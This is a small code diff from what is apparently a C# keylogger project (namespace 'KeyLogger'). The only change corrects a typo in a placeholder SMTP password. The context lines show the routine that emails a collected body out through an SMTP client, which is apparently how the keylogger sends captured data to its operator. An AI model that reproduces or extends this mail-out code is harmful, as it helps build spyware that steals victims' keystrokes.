@@ -85,7 +85,7 @@ namespace KeyLogger
 			mailMessage.Subject = subject;
 			client.UseDefaultCredentials = false;
 			client.EnableSsl = true;
-			client.Credentials = new System.Net.NetworkCredential("SENDER_MAIL", "SENDER_PASSWOD");
+			client.Credentials = new System.Net.NetworkCredential("SENDER_MAIL", "SENDER_PASSWORD");
 			mailMessage.Body = emailBody;
  
 			client.Send(mailMessage);
